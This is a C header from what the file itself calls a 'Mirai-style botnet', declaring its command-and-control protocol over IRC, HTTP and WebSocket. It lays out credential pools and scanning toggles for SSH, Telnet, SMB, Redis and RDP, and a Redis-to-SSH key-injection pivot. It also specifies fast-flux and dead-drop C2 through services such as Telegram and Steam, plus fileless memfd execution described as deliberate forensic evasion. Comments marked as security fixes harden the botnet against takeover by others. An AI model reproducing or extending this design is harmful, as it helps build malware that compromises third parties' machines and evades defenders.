/*
 * notnet - Modern Mirai-Style Botnet
 * protocol.h - C2 protocol abstraction (IRC, HTTP, WebSocket)
 */
#ifndef NOTNET_PROTOCOL_H
#define NOTNET_PROTOCOL_H

#include "config.h"
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>

/* ── Connection Types ───────────────────────────────────────── */
#define C2_IRC   0x01
#define C2_HTTP  0x02
#define C2_WS    0x04

/* ── TLS ─────────────────────────────────────────────────────── */
/* TLS wrapper for existing socket fds.
 * TLS_ENABLED must be defined at compile time (-DTLS_ENABLED).
 * If TLS is not compiled in, tls_* functions are no-ops that pass
 * through to the raw socket. */
typedef struct {
    int enabled;
    void *ssl;       /* SSL* from OpenSSL, or NULL if TLS disabled */
    int sock;        /* underlying socket fd */
} notnet_tls_t;

/* ── IRC State ──────────────────────────────────────────────── */
typedef struct {
    char server[256];
    uint16_t port;
    char channel[128];
    char pass[64];
    char nick[32];
    /* SECURITY FIX (#5): Authorized C2 operator nicks.
     * Only PRIVMSGs from these nicks are accepted as commands.
     * Populated from config (irc_auth_nicks=) or defaults to the
     * bot's own nick (self-commands only). */
    char auth_nicks[8][32];
    int auth_nick_count;
    /* SECURITY FIX (#10): DNS pinning to prevent rebinding attacks.
     * On first successful authenticated connection, the resolved IP
     * is cached here. Reconnects must use the same pinned IP. */
    int dns_pinned;
    struct in_addr pinned_addr;
    /* SECURITY FIX (#76): TLS state. Only used when compiled with
     * -DTLS_ENABLED and a cert pin is configured; otherwise disabled
     * and all I/O falls through to the raw socket. */
    notnet_tls_t tls;
    int sock;
    int connected;
    int authenticated;
    int joined;
    time_t last_ping;
} notnet_irc_t;

/* ── HTTP State ─────────────────────────────────────────────── */
typedef struct {
    char server[256];
    uint16_t port;
    char path[128];
    char user_agent[128];
    /* SECURITY FIX (#10): DNS pinning */
    int dns_pinned;
    struct in_addr pinned_addr;
    /* SECURITY FIX (#76): TLS state (see notnet_irc_t.tls) */
    notnet_tls_t tls;
    int sock;
    int connected;
    time_t last_beat;
} notnet_http_t;

/* ── WebSocket State ────────────────────────────────────────── */
typedef struct {
    char server[256];
    uint16_t port;
    char path[128];
    /* SECURITY FIX (#10): DNS pinning */
    int dns_pinned;
    struct in_addr pinned_addr;
    /* SECURITY FIX (#76): TLS state (see notnet_irc_t.tls) */
    notnet_tls_t tls;
    int sock;
    int connected;
    time_t last_beat;
} notnet_ws_t;

/* ── Credentials Pool ───────────────────────────────────────── */
typedef struct {
    char username[64];
    char password[64];
} notnet_cred_t;

/* ── Bot State ──────────────────────────────────────────────── */
typedef struct {
    char hostname[BOT_MAX_HOSTNAME_LEN];
    time_t uptime;
    char os[BOT_MAX_OS_LEN];
    
    uint8_t c2_enabled;
    
    notnet_irc_t c2_irc;
    notnet_http_t c2_http;
    notnet_ws_t c2_ws;
    
    /* SECURITY FIX (#85): Fast-flux C2. When enabled, all three C2
     * channels resolve every A record of their hostname into a rotating
     * cache (see src/protocol.c), rotate the active IP every flux_ttl
     * seconds, and fail over to the next IP on connect/recv timeout.
     * DNS pinning (#10) is bypassed in flux mode by design — the peer
     * IP is expected to change. Disabled by default (single resolution). */
    uint8_t flux_enabled;
    uint32_t flux_ttl;   /* seconds between re-resolution + rotation */
    
    /* SECURITY FIX (#86): Dead-drop C2 resolution. When dead_drop_url is
     * set, the bot fetches an opaque C2-endpoint blob from a legitimate
     * service (Telegram channel, Steam profile, pastebin-style HTTP) at
     * boot and every dead_drop_interval seconds. The blob is applied only
     * if it echoes the shared c2_secret (see secret) — a fetch that fails,
     * is malformed, or does not verify leaves the static endpoints intact
     * (fail-closed). Empty dead_drop_url = disabled. */
    char dead_drop_url[512];
    uint32_t dead_drop_interval;   /* seconds between re-resolution */
    
    /* Credentials */
    notnet_cred_t cred_pool[CRED_POOL_MAX];
    int cred_count;
    
    /* Scan config */
    uint32_t scan_interval;
    uint32_t scan_count;
    
    /* Commands queue */
    char cmd_queue[256][256];
    int cmd_count;
    
    /* Config overrides */
    uint8_t ssh_enabled;
    uint8_t telnet_enabled;
    uint8_t smb_enabled;
    uint8_t redis_enabled;
    uint8_t rdp_enabled;

    /* SECURITY FIX (#84): RAM-only fileless operation. When 0, no
     * persistence is installed and (on Linux) the bot relaunches itself
     * from an anonymous memfd so the running binary has no disk-backed
     * executable. Reboot loses the infection by design — deliberate
     * forensic evasion, not a bug. */
    uint8_t persist_enabled;

    /* Scan targets (explicit IPs/subnets, override default subnets) */
    int scan_target_count;
    char scan_targets[16][256];

    /* Runtime scan limits (for testing) */
    uint32_t scan_timeout_ms;
    uint32_t scan_max_hosts;

    /* Heartbeat interval in seconds (0 = use default) */
    uint32_t heartbeat_interval;

    /* Update tracking */
    time_t last_update;

    /* SECURITY FIX (#35): Shared secret for HTTP/WS C2 authentication.
     * The bot includes it in every heartbeat; the C2 must echo it back
     * in command responses. Commands without a valid secret echo are
     * rejected, giving HTTP/WS the same trust boundary IRC has via the
     * nick allowlist. Configured via c2_secret= in the config file or
     * the NOTNET_C2_SECRET environment variable. Empty = fail-closed
     * (HTTP/WS commands are never trusted). */
    char secret[64];

    /* SECURITY FIX (#81): Expected SHA-256 of the payload binary, as a
     * 64-char lowercase hex string. payload_update() rejects any download
     * whose hash does not match, closing the MITM RCE hole where a 4-byte
     * 'NOTN' magic was the only integrity check (CWE-345). Configured via
     * payload_sha256= in the config file or the NOTNET_PAYLOAD_SHA256
     * environment variable. Empty = fail-closed (update is refused). */
    char payload_sha256[65];

    /* SECURITY FIX (#72): SSH public key injected into Redis
     * authorized_keys (redis_ssh_key= config or NOTNET_REDIS_SSH_KEY env).
     * The old code injected a literal placeholder that OpenSSH rejects,
     * so the Redis -> SSH-22 pivot could never authenticate. */
    char redis_ssh_key[1024];

    /* SECURITY FIX (#76): SHA-256 fingerprint pin of the TLS server
     * certificate. When compiled with -DTLS_ENABLED and this pin is set,
     * all three C2 channels wrap their sockets in TLS and verify the peer
     * cert fingerprint before use. Config: tls_cert_pin_sha256= or env
     * NOTNET_TLS_CERT_PIN_SHA256. Empty = TLS not activated. */
    char tls_cert_pin_sha256[65];

    /* On-target compilation (#69/#81): when binary download fails or the
     * payload pin mismatches, the bot can fetch the source tarball from
     * the C2, verify it against payload_source_sha256 (fail-closed), and
     * compile locally. All three are required for the fallback to run. */
    uint8_t payload_compile_enabled;
    char payload_source_url[512];
    char payload_source_sha256[65];

    /* SECURITY FIX (#14): Rate limiting for C2 commands */
    time_t last_cmd_time;
    int cmd_this_second;
} notnet_bot_t;

/* ── IRC Functions ──────────────────────────────────────────── */
int irc_connect(notnet_bot_t *bot);
int irc_send(notnet_bot_t *bot, const char *format, ...);
int irc_read(notnet_bot_t *bot, char *buf, int len);
void irc_disconnect(notnet_bot_t *bot);

/* ── HTTP Functions ─────────────────────────────────────────── */
int http_connect(notnet_bot_t *bot);
int http_post(notnet_bot_t *bot, const char *data, int len);
/* API CONTRACT (#60): http_get() and http_read() return the FULL HTTP
 * response — status line, headers, and body — into buf, and return the
 * total number of bytes received (or -1 on error, 0 when nothing was
 * readable). They do NOT strip headers. Callers that need only the body
 * must locate the "\r\n\r\n" header terminator themselves (as
 * protocol_process_commands and http_download already do). */
int http_get(notnet_bot_t *bot, char *buf, int len);
/* Dead-drop / arbitrary-URL fetch (#86): GET a plaintext http:// URL into
 * buf (bounded to len bytes total incl. headers) with a 10s timeout, and
 * return the total bytes received (full response — status, headers, body;
 * caller strips the "\r\n\r\n" terminator). Unlike http_get() this does not
 * require an existing C2 connection and can target any host. Cleartext only
 * (the default build has no TLS); callers must NOT treat the transport as a
 * trust boundary. Returns -1 on failure, non-2xx, or empty body. */
int http_get_url(notnet_bot_t *bot, const char *url, char *buf, int len);
int http_read(notnet_bot_t *bot, char *buf, int len);
int http_download(notnet_bot_t *bot, const char *url, const char *dest);
int http_upload(notnet_bot_t *bot, const char *file_path, const char *upload_path);
void http_disconnect(notnet_bot_t *bot);

/* ── WebSocket Functions ────────────────────────────────────── */
int ws_connect(notnet_bot_t *bot);
int ws_send(notnet_bot_t *bot, const char *data, int len);
int ws_read(notnet_bot_t *bot, char *buf, int len);
void ws_disconnect(notnet_bot_t *bot);

/* ── Core Protocol ──────────────────────────────────────────── */
int protocol_connect_all(notnet_bot_t *bot);
int protocol_process_commands(notnet_bot_t *bot);
int protocol_send_heartbeat(notnet_bot_t *bot);
int protocol_resolve_host(const char *host);
char *protocol_hex_encode(const char *data, int len);
int protocol_send_response(notnet_bot_t *bot, const char *command, const char *result);

/* ── TLS ─────────────────────────────────────────────────────── */
/* (notnet_tls_t is defined above, before the channel structs that
 * embed it.) */
int tls_init(notnet_tls_t *tls, int sock);
int tls_setup(notnet_tls_t *tls, int sock, const char *server_name,
              const char *pin_hex);
int tls_pending(notnet_tls_t *tls);
int chan_send(notnet_tls_t *tls, int sock, const char *buf, int len);
int chan_recv(notnet_tls_t *tls, int sock, char *buf, int len);
int tls_handshake(notnet_tls_t *tls, const char *server_name);
int tls_send(notnet_tls_t *tls, const char *buf, int len);
int tls_recv(notnet_tls_t *tls, char *buf, int len);
void tls_close(notnet_tls_t *tls);
void tls_cleanup(void);

/* ── Config ─────────────────────────────────────────────────── */
int load_config(notnet_bot_t *bot, const char *path);

#endif /* NOTNET_PROTOCOL_H */
